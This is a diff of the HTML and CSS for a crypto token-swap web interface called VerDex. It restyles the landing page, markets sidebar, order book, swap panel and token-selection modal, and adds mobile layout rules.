-        margin-bottom: 16px;
-      }
-      .slip-label {
-        font-size: 0.72rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-        flex: 1;
-      }
-      .slip-btn {
-        padding: 4px 10px;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        font-size: 0.72rem;
-        cursor: pointer;
-        transition: all 0.12s;
-      }
-      .slip-btn.active,
-      .slip-btn:hover {
-        background: var(--green-glow);
-        color: var(--green);
-        border-color: var(--green-dark);
-      }
-      .slip-custom {
-        width: 52px;
-        padding: 4px 8px;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        color: var(--text);
-        font-family: var(--font-mono);
-        font-size: 0.72rem;
-        text-align: center;
         outline: none;
+        transition: border-color 0.2s, box-shadow 0.2s;
       }
-      .slip-custom:focus {
-        border-color: var(--green-dark);
-      }
+      .sidebar-search:focus { border-color: var(--green); box-shadow: 0 0 8px rgba(0,255,127,0.2); }
+      .sidebar-search::placeholder { color: var(--text-dim); }
 
-      /* ─── RECENT TRADES ─── */
-      .recent-trades {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        overflow: hidden;
-      }
-      .rt-title {
-        padding: 12px 16px;
-        font-size: 0.75rem;
-        font-family: var(--font-mono);
-        font-weight: 700;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        border-bottom: 1px solid var(--border);
-      }
-      .rt-headers {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr 1fr;
-        padding: 6px 16px;
-        font-size: 0.65rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-        border-bottom: 1px solid var(--border);
-      }
-      .rt-headers span:last-child,
-      .rt-row span:last-child {
-        text-align: right;
-      }
-      .rt-row {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr 1fr;
-        padding: 5px 16px;
-        font-size: 0.75rem;
-        font-family: var(--font-mono);
-      }
-      .rt-row:hover {
-        background: var(--grey2);
-      }
+      /* token list scrollable area */
+      #tokenList { flex: 1; overflow-y: auto; overflow-x: hidden; padding: 6px 0; }
 
-      /* ─── SCROLLBAR ─── */
-      ::-webkit-scrollbar {
-        width: 4px;
-      }
-      ::-webkit-scrollbar-track {
-        background: var(--grey);
-      }
-      ::-webkit-scrollbar-thumb {
-        background: var(--green-dark);
-        border-radius: 2px;
-      }
+      .token-row { display: flex; align-items: center; gap: 10px; padding: 9px 14px; cursor: pointer; transition: background 0.12s; border-left: 2px solid transparent; }
+      .token-row:hover { background: var(--grey2); }
+      .token-row.selected { background: rgba(0,255,127,0.07); border-left-color: var(--green); }
+      .token-info { flex: 1; min-width: 0; }
+      .token-sym { font-weight: 700; font-size: 0.83rem; font-family: var(--font-mono); color: var(--text); display: block; }
+      .token-name { font-size: 0.68rem; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+      .token-price-col { text-align: right; flex-shrink: 0; }
+      .token-price { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text); display: block; font-weight: 700; }
+      .token-change { font-family: var(--font-mono); font-size: 0.68rem; display: block; }
+      .pos { color: var(--green); } .neg { color: var(--red); }
 
-      /* ─── TICKER TAPE ─── */
-      .ticker-tape {
-        overflow: hidden;
-        height: 35px;
-        background: var(--grey2);
-        border-bottom: 1px solid var(--border);
-        display: flex;
-        align-items: center;
-        position: sticky;
-        top: 0;
-        z-index: 99;
-      }
-      .ticker-inner {
-        display: flex;
-        gap: 0;
-        animation: ticker 300s linear infinite;
-        white-space: nowrap;
-      }
-      .ticker-item {
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-        padding: 0 24px;
-        font-family: var(--font-mono);
-        font-size: 0.72rem;
-        border-right: 1px solid var(--border);
-      }
-      .ticker-sym {
-        color: var(--text);
-        font-weight: 700;
-      }
-      @keyframes ticker {
-        0% {
-          transform: translateX(0);
-        }
-        100% {
-          transform: translateX(-50%);
-        }
-      }
+      /* ═══ MAIN CONTENT ═══ */
+      .main-content { flex: 1; overflow-y: auto; padding: 20px 16px; display: flex; gap: 16px; align-items: flex-start; min-width: 0; }
+      .chart-section { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 12px; }
+      .chart-box { background: var(--grey); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
 
-      /* ─── PULSE DOT ─── */
-      .pulse-dot {
-        width: 6px;
-        height: 6px;
-        border-radius: 50%;
-        background: var(--green);
-        animation: pulse 2s ease-in-out infinite;
-        display: inline-block;
-      }
-      @keyframes pulse {
-        0%,
-        100% {
-          opacity: 1;
-          box-shadow: 0 0 0 0 rgba(0, 255, 127, 0.4);
-        }
-        50% {
-          opacity: 0.7;
-          box-shadow: 0 0 0 6px rgba(0, 255, 127, 0);
-        }
-      }
+      .market-stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 10px; }
+      .mstat { background: var(--grey); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; }
+      .mstat-label { font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; font-family: var(--font-mono); margin-bottom: 4px; }
+      .mstat-val { font-family: var(--font-mono); font-size: 0.95rem; font-weight: 700; color: var(--text); }
 
-      /* ─── LOADING ─── */
-      .loading-val {
-        display: inline-block;
-        width: 80px;
-        height: 14px;
-        background: linear-gradient(
-          90deg,
-          var(--grey2) 25%,
-          var(--grey3) 50%,
-          var(--grey2) 75%
-        );
-        background-size: 200% 100%;
-        animation: shimmer 1.5s infinite;
-        border-radius: 3px;
-      }
-      @keyframes shimmer {
-        0% {
-          background-position: -200% 0;
-        }
-        100% {
-          background-position: 200% 0;
-        }
-      }
+      .order-book, .recent-trades { background: var(--grey); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+      .ob-title, .rt-title { padding: 10px 14px; font-size: 0.72rem; font-family: var(--font-mono); font-weight: 700; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; border-bottom: 1px solid var(--border); }
+      .ob-headers { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: 5px 14px; font-size: 0.63rem; color: var(--text-dim); font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.08em; border-bottom: 1px solid var(--border); }
+      .ob-headers span:last-child { text-align: right; }
+      .ob-row { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: 4px 14px; position: relative; font-size: 0.73rem; font-family: var(--font-mono); transition: background 0.1s; }
+      .ob-row:hover { background: var(--grey2); }
+      .ob-bar { position: absolute; top: 0; bottom: 0; right: 0; opacity: 0.12; }
+      .ob-row.ask .ob-bar { background: var(--red); } .ob-row.bid .ob-bar { background: var(--green); }
+      .ob-row.ask .ob-price { color: var(--red); } .ob-row.bid .ob-price { color: var(--green); }
+      .ob-row span:last-child { text-align: right; color: var(--text-dim); }
+      .ob-spread { text-align: center; padding: 7px; font-family: var(--font-mono); font-size: 0.73rem; color: var(--text-dim); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+      .ob-spread span { color: var(--text); font-weight: 700; }
+      .rt-headers { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; padding: 5px 14px; font-size: 0.63rem; color: var(--text-dim); font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.08em; border-bottom: 1px solid var(--border); }
+      .rt-headers span:last-child, .rt-row span:last-child { text-align: right; }
+      .rt-row { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; padding: 4px 14px; font-size: 0.73rem; font-family: var(--font-mono); }
+      .rt-row:hover { background: var(--grey2); }
 
-      /* Responsive tweaks */
+      /* ═══ SWAP PANEL ═══ */
+      .swap-panel { width: 340px; flex-shrink: 0; }
+      .swap-box { background: var(--grey); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 14px; }
+      .swap-tabs { display: flex; border-bottom: 1px solid var(--border); }
+      .swap-tab { flex: 1; padding: 13px; text-align: center; cursor: pointer; font-weight: 700; font-size: 0.87rem; color: var(--text-dim); background: transparent; border: none; transition: all 0.15s; }
+      .swap-tab.active { color: var(--green); border-bottom: 2px solid var(--green); background: rgba(0,255,127,0.04); }
+      .swap-body { padding: 18px; }
+      .swap-field { background: var(--grey2); border: 1px solid var(--border); border-radius: 8px; padding: 13px 15px; margin-bottom: 8px; transition: border-color 0.15s; }
+      .swap-field:focus-within { border-color: rgba(0,255,127,0.4); }
+      .swap-field-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+      .swap-field-label { font-size: 0.7rem; color: var(--text-dim); font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.08em; }
+      .swap-balance { font-size: 0.7rem; color: var(--text-dim); font-family: var(--font-mono); }
+      .swap-balance span { color: var(--green); cursor: pointer; }
+      .swap-field-bottom { display: flex; align-items: center; gap: 10px; }
+      .swap-amount { flex: 1; background: transparent; border: none; outline: none; font-family: var(--font-mono); font-size: 1.35rem; font-weight: 700; color: var(--text); width: 100%; }
+      .swap-amount::placeholder { color: var(--text-dim); }
+      .swap-token-sel { display: flex; align-items: center; gap: 7px; background: var(--grey3); border: 1px solid var(--border); border-radius: 6px; padding: 7px 11px; cursor: pointer; white-space: nowrap; transition: background 0.12s; font-weight: 700; font-size: 0.86rem; color: var(--text); flex-shrink: 0; }
+      .swap-token-sel:hover { background: rgba(0,255,127,0.07); }
+      /* ── token icon inside swap selector ── */
+      .tok-icon { width: 22px; height: 22px; border-radius: 50%; flex-shrink: 0; object-fit: cover; display: block; }
+      .tok-icon-fallback { width: 22px; height: 22px; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 0.5rem; font-weight: 700; color: #fff; }
+      .swap-arrow-btn { width: 34px; height: 34px; border-radius: 50%; background: var(--grey2); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; cursor: pointer; margin: -3px auto; position: relative; z-index: 2; color: var(--green); font-size: 1.1rem; transition: all 0.2s; }
+      .swap-arrow-btn:hover { background: var(--green); color: var(--black); border-color: var(--green); transform: rotate(180deg); }
+      .swap-info { background: var(--grey2); border: 1px solid var(--border); border-radius: 8px; padding: 13px 15px; margin-top: 10px; margin-bottom: 14px; }
+      .swap-info-row { display: flex; justify-content: space-between; font-size: 0.76rem; font-family: var(--font-mono); color: var(--text-dim); margin-bottom: 5px; }
+      .swap-info-row:last-child { margin-bottom: 0; }
+      .swap-info-row span:last-child { color: var(--text); }
+      .btn-swap { width: 100%; padding: 15px; background: var(--green); color: var(--black); font-family: var(--font-display); font-weight: 800; font-size: 1rem; border: none; border-radius: 8px; cursor: pointer; letter-spacing: -0.01em; transition: all 0.15s; box-shadow: 0 0 24px rgba(0,255,127,0.25); }
+      .btn-swap:hover { transform: translateY(-1px); box-shadow: 0 0 36px rgba(0,255,127,0.4); }
+      .slippage-row { display: flex; align-items: center; gap: 7px; margin-bottom: 14px; }
+      .slip-label { font-size: 0.7rem; color: var(--text-dim); font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.08em; flex: 1; }
+      .slip-btn { padding: 4px 9px; background: var(--grey2); border: 1px solid var(--border); border-radius: 4px; color: var(--text-dim); font-family: var(--font-mono); font-size: 0.7rem; cursor: pointer; transition: all 0.12s; }
+      .slip-btn.active, .slip-btn:hover { background: var(--green-glow); color: var(--green); border-color: var(--green-dark); }
+      .slip-custom { width: 50px; padding: 4px 7px; background: var(--grey2); border: 1px solid var(--border); border-radius: 4px; color: var(--text); font-family: var(--font-mono); font-size: 0.7rem; text-align: center; outline: none; }
+      .slip-custom:focus { border-color: var(--green-dark); }
+
+      /* scrollbar */
+      ::-webkit-scrollbar { width: 4px; }
+      ::-webkit-scrollbar-track { background: var(--grey); }
+      ::-webkit-scrollbar-thumb { background: var(--green-dark); border-radius: 2px; }
+
+      /* ticker */
+      .ticker-tape { overflow: hidden; height: 34px; background: var(--grey2); border-bottom: 1px solid var(--border); display: flex; align-items: center; position: sticky; top: 0; z-index: 99; }
+      .ticker-inner { display: flex; animation: ticker 300s linear infinite; white-space: nowrap; }
+      .ticker-item { display: inline-flex; align-items: center; gap: 6px; padding: 0 22px; font-family: var(--font-mono); font-size: 0.7rem; border-right: 1px solid var(--border); }
+      .ticker-sym { color: var(--text); font-weight: 700; }
+      @keyframes ticker { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+
+      .pulse-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: pulse 2s ease-in-out infinite; display: inline-block; }
+      @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(0,255,127,0.4)} 50%{opacity:0.7;box-shadow:0 0 0 6px rgba(0,255,127,0)} }
+
+      /* ═══ MOBILE OVERLAY (sidebar slides over content) ═══ */
+      /* On mobile the sidebar is hidden by default; toggle overlays it */
       @media (max-width: 900px) {
+        nav { padding: 16px 20px; }
+        .nav-links { display: none; }
+        .stats-bar { gap: 24px; flex-wrap: wrap; padding: 20px; }
+        .app-header { padding: 12px 16px; }
+
+        /* sidebar becomes a fixed overlay on mobile */
         .sidebar {
-          display: none;
+          position: fixed;
+          top: 0; left: 0; bottom: 0;
+          z-index: 250;
+          width: var(--sidebar-w);
+          /* hidden off-screen by default on mobile */
+          transform: translateX(-100%);
+          opacity: 1;
+          transition: transform 0.3s cubic-bezier(0.4,0,0.2,1);
+          box-shadow: none;
         }
-        .swap-panel {
-          width: 100%;
+        /* when open on mobile: slide in */
+        .sidebar.mobile-open {
+          transform: translateX(0);
+          box-shadow: 6px 0 32px rgba(0,0,0,0.7);
         }
-        .main-content {
-          flex-direction: column;
-          padding: 16px;
-        }
-        nav {
-          padding: 16px 20px;
-        }
-        .nav-links {
-          display: none;
-        }
-        .stats-bar {
-          gap: 24px;
-          flex-wrap: wrap;
-          padding: 20px;
-        }
+        /* toggle always visible at left edge on mobile */
+        .sidebar-toggle { left: 0 !important; border-left: 1px solid var(--border); border-right: none; border-radius: 0 7px 7px 0; }
+        /* when sidebar is open on mobile, toggle moves with it */
+        .sidebar-toggle.mobile-open { left: var(--sidebar-w) !important; border-left: none; border-right: 1px solid var(--border); border-radius: 0 7px 7px 0; }
+
+        /* mobile overlay backdrop */
+        .sidebar-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 240; }
+        .sidebar-backdrop.show { display: block; }
+
+        /* swap panel full width */
+        .swap-panel { width: 100%; }
+        .main-content { flex-direction: column; padding: 12px; }
+        .market-stats { grid-template-columns: 1fr 1fr; }
       }
+
+      /* ═══ TOKEN MODAL ═══ */
+      #tokenModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(6px); }
+      .modal-box { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; width: 400px; max-height: 560px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+      .modal-head { display: flex; align-items: center; justify-content: space-between; padding: 20px; }
+      .modal-close { cursor: pointer; color: #666; font-size: 1.2rem; }
+      .modal-search-wrap { padding: 0 10px 12px; }
+      .modal-search { width: 100%; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 10px 14px; color: #fff; font-size: 0.85rem; outline: none; box-sizing: border-box; font-family: var(--font-mono); }
+      .modal-search:focus { border-color: rgba(0,255,127,0.4); }
+      #modalTokenList { overflow-y: auto; flex: 1; padding: 0 12px 20px; }
+      .modal-token-row { display: flex; align-items: center; justify-content: space-between; padding: 10px; cursor: pointer; border-radius: 8px; transition: background 0.1s; }
+      .modal-token-row:hover { background: rgba(255,255,255,0.05); }
+
+      /* No-wallet notice for Chrome mobile */
+      .nowallet-notice { font-size: 0.75rem; color: var(--text-dim); font-family: var(--font-mono); margin-top: 8px; text-align: center; padding: 8px 12px; background: rgba(0,255,127,0.05); border: 1px solid var(--border); border-radius: 6px; display: none; }
     </style>
   </head>
   <body>
-    <!-- ═══════════════════════ LANDING ═══════════════════════ -->
+
+    <!-- ═══════════ LANDING ═══════════ -->
     <div id="landing">
-      <div class="orb orb1"></div>
-      <div class="orb orb2"></div>
-
+      <div class="orb orb1"></div><div class="orb orb2"></div>
       <nav>
-        <div class="nav-logo">
-          <div class="logo-diamond"></div>
-          VerDex
-        </div>
+        <div class="nav-logo"><div class="logo-diamond"></div>VerDex</div>
         <ul class="nav-links">
-          <li><a href="#">Docs</a></li>
-          <li><a href="#">Analytics</a></li>
-          <li><a href="#">Governance</a></li>
-          <li><a href="#">Blog</a></li>
+          <li><a href="#">Docs</a></li><li><a href="#">Analytics</a></li>
+          <li><a href="#">Governance</a></li><li><a href="#">Blog</a></li>
         </ul>
-        <div class="nav-badge">
-          <span class="pulse-dot"></span>&nbsp; Mainnet Live
-        </div>
+        <div class="nav-badge"><span class="pulse-dot"></span>&nbsp; Mainnet Live</div>
       </nav>
-
       <div class="hero">
         <div class="hero-eyebrow">Next-Gen Decentralized Exchange</div>
-        <h1 class="hero-title">
-          Swap.<br />
-          <span>Earn. Evolve.</span>
-        </h1>
-        <p class="hero-sub">
-          Trade any token at real-time market prices with zero intermediaries.
-          Ultra-low fees, deep liquidity, and total on-chain transparency.
-        </p>
+        <h1 class="hero-title">Swap.<br/><span>Earn. Evolve.</span></h1>
+        <p class="hero-sub">Trade any token at real-time market prices with zero intermediaries. Ultra-low fees, deep liquidity, and total on-chain transparency.</p>
         <div class="hero-cta-row">
           <button class="btn-launch" onclick="launchApp()">Launch App →</button>
           <button class="btn-ghost">Read the Docs</button>
         </div>
       </div>
-
       <div class="stats-bar">
-        <div class="stat">
-          <span class="stat-val" id="stat-vol">$2.41B</span>
-          <div class="stat-label">24h Volume</div>
-        </div>
-        <div class="stat">
-          <span class="stat-val" id="stat-tvl">$8.73B</span>
-          <div class="stat-label">Total Value Locked</div>
-        </div>
-        <div class="stat">
-          <span class="stat-val">340+</span>
-          <div class="stat-label">Token Pairs</div>
-        </div>
-        <div class="stat">
-          <span class="stat-val">12M+</span>
-          <div class="stat-label">Total Trades</div>
-        </div>
+        <div class="stat"><span class="stat-val">$2.41B</span><div class="stat-label">24h Volume</div></div>
+        <div class="stat"><span class="stat-val">$8.73B</span><div class="stat-label">Total Value Locked</div></div>
+        <div class="stat"><span class="stat-val">340+</span><div class="stat-label">Token Pairs</div></div>
+        <div class="stat"><span class="stat-val">12M+</span><div class="stat-label">Total Trades</div></div>
       </div>
     </div>
 
-    <!-- ═══════════════════════ APP ═══════════════════════ -->
+    <!-- ═══════════ APP ═══════════ -->
     <div id="app">
-      <!-- Ticker tape -->
-      <div class="ticker-tape">
-        <div class="ticker-inner" id="tickerInner">
-          <!-- populated by JS -->
-        </div>
-      </div>
-
-      <!-- Header -->
+      <div class="ticker-tape"><div class="ticker-inner" id="tickerInner"></div></div>
       <div class="app-header">
-        <div class="app-logo" onclick="backToLanding()">
-          <div class="logo-diamond"></div>
-          VerDex
-        </div>
+        <div class="app-logo" onclick="backToLanding()"><div class="logo-diamond"></div>VerDex</div>
         <button class="btn-connect" id="connectBtn">Connect Wallet</button>
       </div>
 
-     <!-- Body -->
-  <div class="app-body">
- 
-    <!-- Sidebar Toggle Button -->
-    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" title="Toggle market panel">
-      <span class="toggle-arrow">&#8249;</span>
-    </button>
- 
-    <!-- Sidebar -->
-    <div class="sidebar" id="appSidebar">
-      <div class="sidebar-title">
-        Markets&nbsp;<span class="pulse-dot" style="vertical-align:middle;margin-left:4px;"></span>
-      </div>
-      <div id="tokenList"><!-- JS --></div>
-    </div>
- 
-    <!-- Main -->
-    <div class="main-content">
-  <!-- Main Middle Column -->
-<div class="main-content-area" style="flex: 1; display: flex; flex-direction: column; gap: 5px;">
+      <div class="app-body">
+        <!-- Mobile backdrop (closes sidebar) -->
+        <div class="sidebar-backdrop" id="sidebarBackdrop" onclick="closeSidebarMobile()"></div>
 
-  <!-- 1. Wide Chart Container -->
-  <div class="chart-box" style="height: 600px; width: 100%; overflow: hidden; background: var(--grey);">
-    <div id="tradingview_dex_chart" style="height: 100%; width: 100%;"></div>
-  </div>
+        <!-- Toggle button -->
+        <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" title="Toggle markets">
+          <span class="toggle-arrow">&#8249;</span>
+        </button>
 
+        <!-- ═══ SIDEBAR ═══ -->
+        <div class="sidebar" id="appSidebar">
+          <div class="sidebar-header">
+            <div class="sidebar-top-row">
+              <span class="sidebar-label">Markets</span>
+              <span class="pulse-dot"></span>
+            </div>
+            <!-- SEARCH BOX -->
+            <input
+              type="text"
+              id="sidebarSearch"
+              class="sidebar-search"
+              placeholder="Search tokens…"
+              oninput="filterSidebar()"
+              autocomplete="off"
+            />
+          </div>
+          <div id="tokenList"></div>
+        </div>
 
-     <!-- Order book + recent trades -->
-     <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
-      <div class="order-book">
-        <div class="ob-title">Order Book</div>
-        <div class="ob-headers"><span>Price</span><span>Amount</span><span style="text-align:right">Total</span></div>
-        <div id="obAsks"></div>
-        <div class="ob-spread">Spread: <span id="obSpread">—</span></div>
-        <div id="obBids"></div>
-      </div>
-      <div class="recent-trades">
-        <div class="rt-title">Recent Trades</div>
-        <div class="rt-headers"><span>Price</span><span>Amount</span><span>Time</span><span>Type</span></div>
-        <div id="recentTradesList"></div>
-      </div>
-    </div>
-</div>
+        <!-- Main content -->
+        <div class="main-content">
+          <div class="chart-section">
+            <!-- Chart -->
+            <div class="chart-box" style="height:520px;">
+              <div id="tradingview_dex_chart" style="height:100%;width:100%;"></div>
+            </div>
+
+            <!-- Order book + recent trades -->
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+              <div class="order-book">
+                <div class="ob-title">Order Book</div>
+                <div class="ob-headers"><span>Price</span><span>Amount</span><span style="text-align:right">Total</span></div>
+                <div id="obAsks"></div>
+                <div class="ob-spread">Spread: <span id="obSpread">—</span></div>
+                <div id="obBids"></div>
+              </div>
+              <div class="recent-trades">
+                <div class="rt-title">Recent Trades</div>
+                <div class="rt-headers"><span>Price</span><span>Amount</span><span>Time</span><span>Type</span></div>
+                <div id="recentTradesList"></div>
+              </div>
+            </div>
+          </div>
 
           <!-- Swap Panel -->
           <div class="swap-panel">
             <div class="swap-box">
               <div class="swap-tabs">
-                <button
-                  class="swap-tab active"
-                  onclick="setSwapTab(this,'swap')"
-                >
-                  Swap Panel
-                </button>
-
+                <button class="swap-tab active" onclick="setSwapTab(this)">Swap Panel</button>
               </div>
               <div class="swap-body">
                 <!-- From -->
                 <div class="swap-field">
                   <div class="swap-field-top">
                     <span class="swap-field-label">You Pay</span>
-                    <span class="swap-balance"
-                      >Balance: <span onclick="setMax()">0.00</span></span
-                    >
+                    <span class="swap-balance">Balance: <span onclick="setMax()">0.00</span></span>
                   </div>
                   <div class="swap-field-bottom">
-                    <input
-                      class="swap-amount"
-                      id="fromAmt"
-                      type="number"
-                      placeholder="0.0"
-                      oninput="calcSwap()"
-                    />
-                    <div
-                      class="swap-token-sel"
-                      onclick="openTokenModal('from')"
-                    >
-                      <div
-                        class="token-dot"
-                        id="fromDot"
-                        style="background: #627eea; color: #fff"
-                      >
-                        ETH
-                      </div>
+                    <input class="swap-amount" id="fromAmt" type="number" placeholder="0.0" oninput="calcSwap()"/>
+                    <div class="swap-token-sel" onclick="openTokenModal('from')">
+                      <span id="fromIconWrap"></span>
                       <span id="fromSym">ETH</span>
-                      <span style="color: var(--text-dim); font-size: 0.8rem"
-                        >▾</span
-                      >
+                      <span style="color:var(--text-dim);font-size:0.78rem;">▾</span>
                     </div>
                   </div>
-                  <div
-                    style="
-                      font-size: 0.72rem;
-                      color: var(--text-dim);
-                      font-family: var(--font-mono);
-                      margin-top: 6px;
-                    "
-                    id="fromUSD"
-                  >
-                    ≈ $0.00
-                  </div>
+                  <div style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);margin-top:5px;" id="fromUSD">≈ $0.00</div>
                 </div>
 
                 <!-- Arrow -->
-                <div style="text-align: center; margin: 4px 0">
+                <div style="text-align:center;margin:3px 0">
                   <div class="swap-arrow-btn" onclick="flipTokens()">⇅</div>
                 </div>
 
@@ -1372,1104 +409,464 @@
                     <span class="swap-balance">Balance: 0.00</span>
                   </div>
                   <div class="swap-field-bottom">
-                    <input
-                      class="swap-amount"
-                      id="toAmt"
-                      type="number"
-                      placeholder="0.0"
-                      readonly
-                    />
+                    <input class="swap-amount" id="toAmt" type="number" placeholder="0.0" readonly/>
                     <div class="swap-token-sel" onclick="openTokenModal('to')">
-                      <div
-                        class="token-dot"
-                        id="toDot"
-                        style="background: #26a17b; color: #fff"
-                      >
-                        USDT
-                      </div>
+                      <span id="toIconWrap"></span>
                       <span id="toSym">USDT</span>
-                      <span style="color: var(--text-dim); font-size: 0.8rem"
-                        >▾</span
-                      >
+                      <span style="color:var(--text-dim);font-size:0.78rem;">▾</span>
                     </div>
                   </div>
-                  <div
-                    style="
-                      font-size: 0.72rem;
-                      color: var(--text-dim);
-                      font-family: var(--font-mono);
-                      margin-top: 6px;
-                    "
-                    id="toUSD"
-                  >
-                    ≈ $0.00
-                  </div>
+                  <div style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);margin-top:5px;" id="toUSD">≈ $0.00</div>
                 </div>
 
                 <!-- Slippage -->
-                <div class="slippage-row" style="margin-top: 14px">
+                <div class="slippage-row" style="margin-top:12px;">
                   <span class="slip-label">Slippage</span>
-                  <button class="slip-btn active" onclick="setSlip(this,'0.1')">
-                    0.1%
-                  </button>
-                  <button class="slip-btn" onclick="setSlip(this,'0.5')">
-                    0.5%
-                  </button>
-                  <button class="slip-btn" onclick="setSlip(this,'1.0')">
-                    1.0%
-                  </button>
-                  <input
-                    class="slip-custom"
-                    id="slipCustom"
-                    placeholder="Custom"
-                    type="number"
-                  />
+                  <button class="slip-btn active" onclick="setSlip(this)">0.1%</button>
+                  <button class="slip-btn" onclick="setSlip(this)">0.5%</button>
+                  <button class="slip-btn" onclick="setSlip(this)">1.0%</button>
+                  <input class="slip-custom" id="slipCustom" placeholder="%" type="number"/>
                 </div>
 
                 <!-- Info -->
                 <div class="swap-info">
-                  <div class="swap-info-row">
-                    <span>Rate</span><span id="swapRate">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Balance</span><span id="fromBalance">0.00</span>
-                  </div>
-                </div>
-                  <div class="swap-info-row">
-                    <span>Price Impact</span><span id="priceImpact">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Network Fee</span><span id="networkFee">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Min. Received</span><span id="minReceived">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Route</span
-                    ><span id="swapRoute" style="color: var(--green)">—</span>
-                  </div>
+                  <div class="swap-info-row"><span>Rate</span><span id="swapRate">—</span></div>
+                  <div class="swap-info-row"><span>Balance</span><span id="fromBalance">0.00</span></div>
+                  <div class="swap-info-row"><span>Price Impact</span><span id="priceImpact">—</span></div>
+                  <div class="swap-info-row"><span>Network Fee</span><span id="networkFee">—</span></div>
+                  <div class="swap-info-row"><span>Min. Received</span><span id="minReceived">—</span></div>
+                  <div class="swap-info-row"><span>Route</span><span id="swapRoute" style="color:var(--green)">—</span></div>
                 </div>
 
-                <button class="btn-swap" onclick="executeSwap()">
-                  Swap Tokens
-                </button>
+                <button class="btn-swap" onclick="executeSwap()">Swap Tokens</button>
+                <!-- shown on mobile Chrome when no wallet detected -->
+                <div class="nowallet-notice" id="noWalletNotice">
+                  No wallet detected. Open in MetaMask browser or install the MetaMask extension.
+                </div>
               </div>
             </div>
           </div>
-          <!-- /swap-panel -->
+        </div><!-- /main-content -->
+      </div><!-- /app-body -->
+    </div><!-- /app -->
+
+    <!-- ═══ TOKEN MODAL ═══ -->
+    <div id="tokenModal">
+      <div class="modal-box">
+        <div class="modal-head">
+          <span style="font-weight:700;font-size:1.1rem;color:#fff;">Select Token</span>
+          <span class="modal-close" onclick="closeTokenModal()">✕</span>
         </div>
-        <!-- /main-content -->
+        <div class="modal-search-wrap">
+          <input type="text" id="modaltokensearch" class="modal-search" placeholder="Search name or symbol…" oninput="filterTokens()" autocomplete="off"/>
+        </div>
+        <div id="modalTokenList"></div>
       </div>
-      <!-- /app-body -->
-    </div>
-    <!-- /app -->
-<!-- ═══════════════ TOKEN MODAL ═══════════════ -->
-<div
-  id="tokenModal"
-  style="
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.85);
-    z-index: 1000;
-    align-items: center;
-    justify-content: center;
-    backdrop-filter: blur(6px);
-  "
->
-  <div
-    style="
-      background: #1a1a1a; /* Using a dark grey for Chainr theme */
-      border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 16px;
-      width: 400px;
-      max-height: 560px;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-    "
-  >
-    <div
-      style="
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 20px;
-      "
-    >
-      <span style="font-weight: 700; font-size: 1.1rem; color: #fff;">Select Token</span>
-      <span
-        style="cursor: pointer; color: #666; font-size: 1.2rem"
-        onclick="closeTokenModal()"
-        >✕</span
-      >
     </div>
 
-    <div style="padding: 0 10px 12px">
-      <input 
-          type="text"
-          id="modaltokensearch" 
-          placeholder="Search name or symbol..." 
-          oninput="filterTokens()"
-          autocomplete="off"
-          style="
-            width: 100%;
